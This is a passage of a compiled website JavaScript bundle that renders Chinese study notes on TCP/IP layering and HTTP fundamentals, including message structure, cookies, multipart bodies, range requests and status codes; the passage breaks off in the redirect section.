(window.webpackJsonp=window.webpackJsonp||[]).push([[186],{713:function(a,t,s){"use strict";s.r(t);var e=s(1),l=Object(e.a)({},(function(){var a=this,t=a._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h2",{attrs:{id:"_1-网络基础-tcp-ip"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-网络基础-tcp-ip"}},[a._v("#")]),a._v(" 1. 网络基础 TCP/IP")]),a._v(" "),t("ul",[t("li",[a._v("通常使用的网络（包括互联网）是在 TCP/IP 协议族的基础上运作的，而 HTTP 属于它内部的一个子集。")])]),a._v(" "),t("h2",{attrs:{id:"_2-tcp-ip-的分层管理"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-tcp-ip-的分层管理"}},[a._v("#")]),a._v(" 2. TCP/IP 的分层管理")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("TCP/IP 协议族里重要的一点就是分层。TCP/IP 协议族按层次分别分为以下 4 层：应用层、传输层、网络层和数据链路层。")])]),a._v(" "),t("li",[t("p",[a._v("应用层。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("应用层决定了向用户提供应用服务时通信的活动。")]),a._v(" "),t("li",[a._v("TCP/IP 协议族内预存了各类通用的应用服务。比如，FTP（FileTransfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）服务就是其中两类。")]),a._v(" "),t("li",[a._v("HTTP 协议也处于该层。")])])])]),a._v(" "),t("li",[t("p",[a._v("传输层。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。")]),a._v(" "),t("li",[a._v("在传输层有两个性质不同的协议：TCP（Transmission ControlProtocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）。")])])])]),a._v(" "),t("li",[t("p",[a._v("网络层（又名网络互连层）。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。")]),a._v(" "),t("li",[a._v("与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。")])])])]),a._v(" "),t("li",[t("p",[a._v("链路层（又名数据链路层，网络接口层）。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。")])])])])]),a._v(" "),t("h2",{attrs:{id:"_3-tcp-ip-通信传输流"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-tcp-ip-通信传输流"}},[a._v("#")]),a._v(" 3. TCP/IP 通信传输流")]),a._v(" "),t("ul",[t("li",[a._v("利用 TCP/IP 协议族进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收端则往应用层往上走。")])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/TCPIP 通信传输流-1.png"),loading:"lazy"}}),a._v(" "),t("ul",[t("li",[t("p",[a._v("我们用 HTTP 举例来说明，首先作为发送端的客户端在应用层（HTTP 协议）发出一个想看某个 Web 页面的 HTTP 请求。")])]),a._v(" "),t("li",[t("p",[a._v("接着，为了传输方便，在传输层（TCP 协议）把从应用层处收到的数据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端口号后转发给网络层。")])]),a._v(" "),t("li",[t("p",[a._v("在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链路层。这样一来，发往网络的通信请求就准备齐全了。")])]),a._v(" "),t("li",[t("p",[a._v("接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用层。当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP 请求。")])]),a._v(" "),t("li",[t("p",[a._v("发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层时会把对应的首部消去。")]),a._v(" "),t("blockquote",[t("p",[a._v("这种把数据信息包装起来的做法称为封装（encapsulate）。")])])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/TCPIP 通信传输流-2.png"),loading:"lazy"}}),a._v(" "),t("h2",{attrs:{id:"_4-负责传输的-ip-协议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_4-负责传输的-ip-协议"}},[a._v("#")]),a._v(" 4. 负责传输的 IP 协议")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("按层次分，IP（Internet Protocol）网际协议位于网络层。InternetProtocol 这个名称可能听起来有点夸张，但事实正是如此，因为几乎所有使用网络的系统都会用到 IP 协议。TCP/IP 协议族中的 IP 指的就是网际协议，协议名称中占据了一半位置，其重要性可见一斑。可能有人会把 “IP” 和 “IP 地址” 搞混，“IP” 其实是一种协议的名称。")])]),a._v(" "),t("li",[t("p",[a._v("IP 协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是 IP 地址和 MAC 地址（Media Access Control Address）。")])]),a._v(" "),t("li",[t("p",[a._v("IP 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC 地址基本上不会更改。")])]),a._v(" "),t("li",[t("p",[a._v("使用 ARP 协议凭借 MAC 地址进行通信。")]),a._v(" "),t("blockquote",[t("p",[a._v("IP 间的通信依赖 MAC 地址。在网络上，通信的双方在同一局域网（LAN）内的情况是很少的，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的 MAC 地址来搜索下一个中转目标。这时，会采用 ARP 协议（AddressResolution Protocol）。ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。")])])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/负责传输的 IP 协议.png"),loading:"lazy"}}),a._v(" "),t("h2",{attrs:{id:"_5-确保可靠性的-tcp-协议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_5-确保可靠性的-tcp-协议"}},[a._v("#")]),a._v(" 5. 确保可靠性的 TCP 协议")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("按层次分，TCP 位于传输层，提供可靠的字节流服务。所谓的字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。而可靠的传输服务是指，能够把数据准确可靠地传给对方。一言以蔽之，TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方。")])]),a._v(" "),t("li",[t("p",[a._v("为了准确无误地将数据送达目标处，TCP 协议采用了三次握手（three-way handshaking）策略。用 TCP 协议把数据包送出去后，TCP 不会对传送后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了 TCP 的标志（flag） —— SYN（synchronize） 和 ACK（acknowledgement）。")])]),a._v(" "),t("li",[t("p",[a._v("发送端首先发送一个带 SYN 标志的数据包给对方。接收端收到后，回传一个带有 SYN/ACK 标志的数据包以示传达确认信息。最后，发送端再回传一个带 ACK 标志的数据包，代表 “握手” 结束。")])]),a._v(" "),t("li",[t("p",[a._v("若在握手过程中某个阶段莫名中断，TCP 协议会再次以相同的顺序发送相同的数据包。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/确保可靠性的 TCP 协议.png"),loading:"lazy"}}),a._v(" "),t("h2",{attrs:{id:"_6-负责域名解析的-dns-服务"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_6-负责域名解析的-dns-服务"}},[a._v("#")]),a._v(" 6. 负责域名解析的 DNS 服务")]),a._v(" "),t("ul",[t("li",[a._v("DNS（Domain Name System）服务是和 HTTP 协议一样位于应用层的协议。它提供域名到 IP 地址之间的解析服务。")])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/负责域名解析的 DNS 服务.png"),loading:"lazy"}}),a._v(" "),t("h2",{attrs:{id:"_7-各种协议与-http-协议的关系"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_7-各种协议与-http-协议的关系"}},[a._v("#")]),a._v(" 7. 各种协议与 HTTP 协议的关系")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/各种协议与 HTTP 协议的关系.png"),loading:"lazy"}}),a._v(" "),t("h2",{attrs:{id:"_8-统一资源标识符"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_8-统一资源标识符"}},[a._v("#")]),a._v(" 8. 统一资源标识符")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("URI 是 Uniform Resource Identifier 的缩写。RFC2396 分别对这 3 个单词进行了如下定义。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("Uniform：规定统一的格式可方便处理多种不同类型的资源，而不用根据上下文环境来识别资源指定的访问方式。另外，加入新增的协议方案（如 http: 或 ftp:）也更容易。")]),a._v(" "),t("li",[a._v("Resource：资源的定义是 “可标识的任何东西”。除了文档文件、图像或服务（例如当天的天气预报）等能够区别于其他类型的，全都可作为资源。另外，资源不仅可以是单一的，也可以是多数的集合体。")]),a._v(" "),t("li",[a._v("Identifier：表示可标识的对象，也称为标识符。")])])])]),a._v(" "),t("li",[t("p",[a._v("综上所述，URI 就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型名称。采用 HTTP 协议时，协议方案就是 http。除此之外，还有 ftp、mailto、telnet、file 等。")])]),a._v(" "),t("li",[t("p",[a._v("URI 用字符串标识某一互联网资源，而 URL 表示资源的地点（互联网上所处的位置）。可见 URL 是 URI 的子集。")])]),a._v(" "),t("li",[t("p",[a._v("绝对 URI 的格式。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/统一资源标识符.png"),loading:"lazy"}})])]),a._v(" "),t("h2",{attrs:{id:"_9-通过请求和响应的交换达成通信"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_9-通过请求和响应的交换达成通信"}},[a._v("#")]),a._v(" 9. 通过请求和响应的交换达成通信")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("请求报文的构成。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/请求报文的构成.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("响应报文的构成。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/响应报文的构成.png"),loading:"lazy"}})])]),a._v(" "),t("h2",{attrs:{id:"_10-http-是不保存状态的协议"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_10-http-是不保存状态的协议"}},[a._v("#")]),a._v(" 10. HTTP 是不保存状态的协议")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。")])]),a._v(" "),t("li",[t("p",[a._v("使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。可是，随着 Web 的不断发展，因无状态而导致业务处理变得棘手的情况增多了。")])]),a._v(" "),t("li",[t("p",[a._v("HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。")])])]),a._v(" "),t("h2",{attrs:{id:"_11-使用方法下达命令"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_11-使用方法下达命令"}},[a._v("#")]),a._v(" 11. 使用方法下达命令")]),a._v(" "),t("ul",[t("li",[a._v("HTTP/1.0 和 HTTP/1.1 支持的方法。")])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/使用方法下达命令.png"),loading:"lazy"}}),a._v(" "),t("h2",{attrs:{id:"_12-持久连接节省通信量"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_12-持久连接节省通信量"}},[a._v("#")]),a._v(" 12. 持久连接节省通信量")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("HTTP 协议的初始版本中，每进行一次 HTTP 通信就要断开一次 TCP 连接。")])]),a._v(" "),t("li",[t("p",[a._v("为解决上述 TCP 连接的问题，HTTP/1.1 和一部分的 HTTP/1.0 想出了持久连接（HTTP Persistent Connections，也称为 HTTP keep-alive 或 HTTP connection reuse）的方法。持久连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。")])]),a._v(" "),t("li",[t("p",[a._v("在 HTTP/1.1 中，所有的连接默认都是持久连接，但在 HTTP/1.0 内并未标准化。")])]),a._v(" "),t("li",[t("p",[a._v("持久连接使得多数请求以管线化（pipelining）方式发送成为可能。从前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术出现后，不用等待响应亦可直接发送下一个请求。这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。")])])]),a._v(" "),t("h2",{attrs:{id:"_13-使用-cookie-的状态管理"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_13-使用-cookie-的状态管理"}},[a._v("#")]),a._v(" 13. 使用 Cookie 的状态管理")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。")])]),a._v(" "),t("li",[t("p",[a._v("服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。")])])]),a._v(" "),t("h2",{attrs:{id:"_14-http-报文"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_14-http-报文"}},[a._v("#")]),a._v(" 14. HTTP 报文")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("用于 HTTP 协议交互的信息被称为 HTTP 报文。请求端（客户端）的 HTTP 报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP 报文本身是由多行（用 CR+LF 作换行符）数据构成的字符串文本。")])]),a._v(" "),t("li",[t("p",[a._v("HTTP 报文的结构。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/HTTP 报文的结构.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("请求报文及响应报文的结构。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/请求报文及响应报文的结构.png"),loading:"lazy"}})])]),a._v(" "),t("h2",{attrs:{id:"_15-报文主体和实体主体的差异"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_15-报文主体和实体主体的差异"}},[a._v("#")]),a._v(" 15. 报文主体和实体主体的差异")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("报文（message）：是 HTTP 通信中的基本单位，由 8 位组字节流（octet sequence，其中 octet 为 8 个比特）组成，通过 HTTP 通信传输。")])]),a._v(" "),t("li",[t("p",[a._v("实体（entity）：作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成。")])]),a._v(" "),t("li",[t("p",[a._v("HTTP 报文的主体用于传输请求或响应的实体主体。通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，才导致它和报文主体产生差异。")])])]),a._v(" "),t("h2",{attrs:{id:"_16-压缩传输的内容编码"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_16-压缩传输的内容编码"}},[a._v("#")]),a._v(" 16. 压缩传输的内容编码")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("内容编码指明应用在实体内容上的编码格式，并保持实体信息原样压缩。内容编码后的实体由客户端接收并负责解码。")])]),a._v(" "),t("li",[t("p",[a._v("常用的内容编码有以下几种。")]),a._v(" "),t("ol",[t("li",[a._v("gzip（GNU zip）")]),a._v(" "),t("li",[a._v("compress（UNIX 系统的标准压缩）")]),a._v(" "),t("li",[a._v("deflate（zlib）")]),a._v(" "),t("li",[a._v("identity（不进行编码）")])])])]),a._v(" "),t("h2",{attrs:{id:"_17-分割发送的分块传输编码"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_17-分割发送的分块传输编码"}},[a._v("#")]),a._v(" 17. 分割发送的分块传输编码")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("在 HTTP 通信过程中，请求的编码实体资源尚未全部传输完成之前，浏览器无法显示请求页面。在传输大容量数据时，通过把数据分割成多块，能够让浏览器逐步显示页面。")])]),a._v(" "),t("li",[t("p",[a._v("这种把实体主体分块的功能称为分块传输编码（Chunked TransferCoding）。")])]),a._v(" "),t("li",[t("p",[a._v("分块传输编码会将实体主体分成多个部分（块）。每一块都会用十六进制来标记块的大小，而实体主体的最后一块会使用 “0(CR+LF)” 来标记。")])]),a._v(" "),t("li",[t("p",[a._v("HTTP/1.1 中存在一种称为传输编码（Transfer Coding）的机制，它可以在通信时按某种编码方式传输，但只定义作用于分块传输编码中。")])])]),a._v(" "),t("h2",{attrs:{id:"_18-发送多种数据的多部分对象集合"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_18-发送多种数据的多部分对象集合"}},[a._v("#")]),a._v(" 18. 发送多种数据的多部分对象集合")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("发送邮件时，我们可以在邮件里写入文字并添加多份附件。这是因为采用了 MIME（Multipurpose Internet Mail Extensions，多用途因特网邮件扩展）机制，它允许邮件处理文本、图片、视频等多个不同类型的数据。例如，图片等二进制数据以 ASCII 码字符串编码的方式指明，就是利用 MIME 来描述标记数据类型。而在 MIME 扩展中会使用一种称为多部分对象集合（Multipart）的方法，来容纳多份不同类型的数据。")])]),a._v(" "),t("li",[t("p",[a._v("相应地，HTTP 协议中也采纳了多部分对象集合，发送的一份报文主体内可含有多类型实体。通常是在图片或文本文件等上传时使用。")])]),a._v(" "),t("li",[t("p",[a._v("多部分对象集合包含的对象如下。")]),a._v(" "),t("blockquote",[t("p",[a._v("multipart/form-data: 在 Web 表单文件上传时使用。")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Type")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("multipart/form-data; boundary=AaB03x")])]),a._v("\n--AaB03x\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Disposition")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v('form-data; name="field1"')])]),a._v("\nJoe Blow\n--AaB03x\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Disposition")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v('form-data; name="pics"; filename="file1.txt"')])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Type")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("text/plain")])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token text-plain"}},[a._v("...（file1.txt的数据）...\n--AaB03x--\n")])])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br")])]),t("blockquote",[t("p",[a._v("multipart/byteranges: 状态码 206（Partial Content，部分内容）响应报文包含了多个范围的内容时使用。")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token response-status"}},[t("span",{pre:!0,attrs:{class:"token http-version property"}},[a._v("HTTP/1.1")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token status-code number"}},[a._v("206")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token reason-phrase string"}},[a._v("Partial Content")])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Date")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("Fri, 13 Jul 2012 02:45:26 GMT")])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Last-Modified")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("Fri, 31 Aug 2007 02:02:20 GMT")])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Type")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("multipart/byteranges; boundary=THIS_STRING_SEPARATES")])]),a._v("\n--THIS_STRING_SEPARATES\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Type")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("application/pdf")])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Range")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("bytes 500-999/8000")])]),a._v("\n...（范围指定的数据）...\n--THIS_STRING_SEPARATES\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Type")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("application/pdf")])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Range")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("bytes 7000-7999/8000")])]),a._v("\n...（范围指定的数据）...\n--THIS_STRING_SEPARATES--\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br"),t("span",{staticClass:"line-number"},[a._v("12")]),t("br"),t("span",{staticClass:"line-number"},[a._v("13")]),t("br")])])]),a._v(" "),t("li",[t("p",[a._v("使用 boundary 字符串来划分多部分对象集合指明的各类实体。在 boundary 字符串指定的各个实体的起始行之前插入 “--” 标记（例如：--AaB03x、--THIS_STRING_SEPARATES），而在多部分对象集合对应的字符串的最后插入 “--” 标记（例如：--AaB03x--、--THIS_STRING_SEPARATES--）作为结束。")])]),a._v(" "),t("li",[t("p",[a._v("多部分对象集合的每个部分类型中，都可以含有首部字段。")])])]),a._v(" "),t("h2",{attrs:{id:"_19-获取部分内容的范围请求"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_19-获取部分内容的范围请求"}},[a._v("#")]),a._v(" 19. 获取部分内容的范围请求")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("以前，用户不能使用现在这种高速的带宽访问互联网，当时，下载一个尺寸稍大的图片或文件就已经很吃力了。如果下载过程中遇到网络中断的情况，那就必须重头开始。为了解决上述问题，需要一种可恢复的机制。所谓恢复是指能从之前下载中断处恢复下载。")])]),a._v(" "),t("li",[t("p",[a._v("要实现该功能需要指定下载的实体范围。像这样，指定范围发送的请求叫做范围请求（Range Request）。")])]),a._v(" "),t("li",[t("p",[a._v("对一份 10 000 字节大小的资源，如果使用范围请求，可以只请求 5001~10 000 字节内的资源。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/获取部分内容的范围请求.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("执行范围请求时，会用到首部字段 Range 来指定资源的 byte 范围。byte 范围的指定形式如下。")]),a._v(" "),t("blockquote",[t("p",[a._v("5001~10 000 字节")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Range")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("bytes=5001-10000")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("blockquote",[t("p",[a._v("从 5001 字节之后全部的")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Range")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("bytes=5001-")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("blockquote",[t("p",[a._v("从一开始到 3000 字节和 5000~7000 字节的多重范围")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Range")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("bytes=-3000, 5000-7000")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])])]),a._v(" "),t("li",[t("p",[a._v("针对范围请求，响应会返回状态码为 206 Partial Content 的响应报文。另外，对于多重范围的范围请求，响应会在首部字段 Content-Type 标明 multipart/byteranges 后返回响应报文。如果服务器端无法响应范围请求，则会返回状态码 200 OK 和完整的实体内容。")])])]),a._v(" "),t("h2",{attrs:{id:"_20-返回结果的-http-状态码"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_20-返回结果的-http-状态码"}},[a._v("#")]),a._v(" 20. 返回结果的 HTTP 状态码")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("状态码的类别。")]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/状态码的类别.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("2XX 成功。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("200 OK：表示从客户端发来的请求在服务器端被正常处理了。在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返回。而使用 HEAD 方法时，对应请求资源的实体首部不随报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。")])]),a._v(" "),t("li",[t("p",[a._v("204 No Content：该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面不发生更新。一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。")])]),a._v(" "),t("li",[t("p",[a._v("206 Partial Content：该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。")])])])]),a._v(" "),t("li",[t("p",[a._v("3XX 重定向/缓存。")]),a._v(" "),t("ul",[t("li",[a._v("301 Moved Permanently：永久性重定向。该状态码表示请求的资源已被分配了新的 URI，以后应使用资源现在所指的 